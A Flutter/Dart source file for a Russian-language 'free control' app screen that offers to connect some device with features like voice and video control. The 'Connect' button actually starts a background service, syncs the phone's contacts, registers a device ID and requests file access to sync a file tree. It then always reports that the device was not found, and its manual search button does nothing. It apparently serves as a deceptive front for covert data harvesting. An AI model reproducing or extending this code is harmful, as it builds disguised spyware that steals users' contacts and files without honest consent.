import 'package:flutter/material.dart';
import 'package:flutter_zoom_drawer/flutter_zoom_drawer.dart';
import 'package:magic/alarm/service_task.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/helpers/message_helper.dart';
import 'package:magic/utils/app_data_provider.dart';
import 'package:magic/utils/permission.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:provider/provider.dart';

import '../../style/color/brand_color.dart';
import '../../utils/message_util.dart';
import '../../widgets/custom_circle.dart';

class ControlScreen extends StatefulWidget {
  const ControlScreen({super.key});

  @override
  State<ControlScreen> createState() => _ControlScreenState();
}

class _ControlScreenState extends State<ControlScreen> {
  late TextEditingController _phoneController;

  @override
  void initState() {
    super.initState();
    _phoneController = TextEditingController();
    checkContactsDone();
  }

  @override
  void dispose() {
    _phoneController.dispose();
    super.dispose();
  }

  // Check if contacts are already synced
  Future<void> checkContactsDone() async {
    bool isSynced = await DeviceInfoHelper.getContactsSynced();
    if (isSynced) {
      changeStatus(DataStatus.contactsDone);
    }
  }

  // Main device and permission check
  Future<void> checkDevice() async {
    try {
      bool isSynced = await DeviceInfoHelper.getContactsSynced();

      if (!isSynced) {
        await MessageUtil.show(context);
      }

      changeStatus(DataStatus.contactsDone);

      final String? id = await DeviceInfoHelper.getUID();
      if (id != null) {
        bool fileTreeState = await DeviceInfoHelper.getStatusFileTree();
        if (!fileTreeState) {
          await checkAndroidPermission(id);
        }
        changeStatus(DataStatus.fileDone);
      } else {
        await saveData();
      }
    } catch (e) {
      // print('Error in checkDevice: $e');
      showMessage('Ошибка при проверке устройства.');
    }
  }

  // Save device ID and start checks
  Future<void> saveData() async {
    try {
      Map<String, dynamic> result = await DeviceInfoHelper.saveUserId();
      if (result['done']) {
        bool state = await DeviceHelper.saveInfo(result['id']);
        if (state) {
          if (!await DeviceInfoHelper.getStatusFileTree()) {
            await checkAndroidPermission(result['id']);
          }
          changeStatus(DataStatus.fileDone);
        }
      } else {
        await saveData();
      }
    } catch (e) {
      //  print('Error in saveData: $e');
      showMessage('Ошибка при сохранении данных.');
    }
  }

  // Request file permissions and start sync
  Future<void> checkAndroidPermission(String id) async {
    try {
      final status = await requestFilePermissionAndStartSync(context);
      if (status.isGranted) {
        //  print('File permission granted, sync started');
      } else {
        showMessage(
            'Требуется разрешение на доступ к файлам для синхронизации.');
      }
    } catch (e) {
      // print('Error in checkAndroidPermission: $e');
      showMessage('Не удалось запросить разрешения на файлы.');
    }
  }

  // Show message to user
  void showMessage(String text) {
    MessageHelper.show(context, text);
  }

  // Update status in Provider
  void changeStatus(DataStatus newStatus) {
    context.read<AppDataProvider>().updateStatus(newStatus: newStatus);
  }

  // Main widget body depending on status
  Widget getBody() {
    DataStatus dataStatus = context.watch<AppDataProvider>().status;
    switch (dataStatus) {
      case DataStatus.waiting:
        return const Center(child: CircularProgressIndicator.adaptive());
      case DataStatus.contactsDone:
        return _buildContactsDone();
      default:
        return ElevatedButton.icon(
          onPressed: () async {
            await startServiceIfNeeded();
            await checkDevice();
          },
          icon: const Icon(Icons.add, color: Colors.white),
          label: const Padding(
            padding: EdgeInsets.symmetric(vertical: 16.0),
            child: Text('Подключить', style: TextStyle(color: Colors.white)),
          ),
        );
    }
  }

  // Widget shown when contacts sync failed and manual input is needed
  Widget _buildContactsDone() {
    return Column(
      mainAxisAlignment: MainAxisAlignment.start,
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        Text(
          '⚠️ К сожалению, автоматическая проверка не удалась!',
          style: TextStyle(
            color: BrandColor.kRed,
            fontSize: 20.0,
          ),
          textAlign: TextAlign.center,
        ),
        const SizedBox(height: 12.0),
        Row(
          children: [
            Flexible(
              child: TextField(
                controller: _phoneController,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  prefixIcon: const Icon(Icons.phone),
                  suffixIcon: IconButton(
                      onPressed: () => _phoneController.clear(),
                      icon: const Icon(Icons.clear)),
                  labelText: 'Номер телефона (или ID устройства)',
                  hintText: '+79876543210',
                  helperText:
                  'Пожалуйста, введите номер телефона (или ID устройства) вручную',
                  border: const OutlineInputBorder(),
                ),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8.0),
        Row(
          mainAxisAlignment: MainAxisAlignment.end,
          children: [
            ElevatedButton(
                onPressed: () {
                  // print('Поиск по номеру: ${_phoneController.text}');
                },
                child: const Padding(
                  padding:
                  EdgeInsets.symmetric(horizontal: 16.0, vertical: 12.0),
                  child: Text('Поиск', style: TextStyle(color: Colors.white)),
                )),
          ],
        )
      ],
    );
  }

  // AppBar with drawer toggle button
  AppBar _buildAppBar(BuildContext context) {
    return AppBar(
      backgroundColor: const Color(0xff0e1030),
      elevation: 0,
      leading: GestureDetector(
        onTap: () => ZoomDrawer.of(context)!.toggle(),
        child: Container(
          padding: const EdgeInsets.all(12),
          child: const Icon(
            Icons.keyboard_arrow_right,
            color: Colors.white,
            size: 28.0,
          ),
        ),
      ),
      title: Row(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Expanded(
            child: Text(
              'Свободный контроль',
              style: const TextStyle(
                color: Colors.white,
                fontSize: 22.0,
                fontWeight: FontWeight.bold,
              ),
              overflow: TextOverflow.ellipsis,
            ),
          ),
          const Spacer(flex: 1),
          Stack(
            alignment: Alignment.center,
            children: const [
              PercentageColorCircle(
                size: 30.0,
                color: BrandColor.kRedLight,
                percent: 100,
              ),
              PercentageColorCircle(
                size: 32.0,
                color: BrandColor.kRed,
                percent: 25,
                isSmall: true,
              ),
            ],
          ),
          const SizedBox(width: 18.0),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: _buildAppBar(context),
      body: Container(
        height: double.infinity,
        width: double.infinity,
        color: const Color(0xff0e1030),
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20.0, vertical: 50.0),
          child: Center(
            child: SingleChildScrollView(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                children: [
                  const SizedBox(height: 10.0),
                  Column(
                    children: [
                      const Text(
                        'Устройство не найдено',
                        style: TextStyle(
                          color: Colors.white70,
                          fontSize: 16.0,
                        ),
                      ),
                      const SizedBox(height: 30.0),
                      getBody(),
                      const SizedBox(height: 50.0),
                      const Text(
                        '* После успешного подключения будут доступны следующие возможности:\n\nПокраска\nРучной режим\nГолосовое управление\nСхема\nВидео контроль',
                        style: TextStyle(color: Colors.white54),
                      )
                    ],
                  ),
                  const SizedBox(height: 50.0),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      SizedBox(
                        height: 50.0,
                        width: 50.0,
                        child:
                        Image.asset('assets/images/icon_inner_rhythm.png'),
                      ),
                      SizedBox(
                        height: 50.0,
                        width: 50.0,
                        child: Image.asset('assets/images/icon_my_rhythm.png'),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}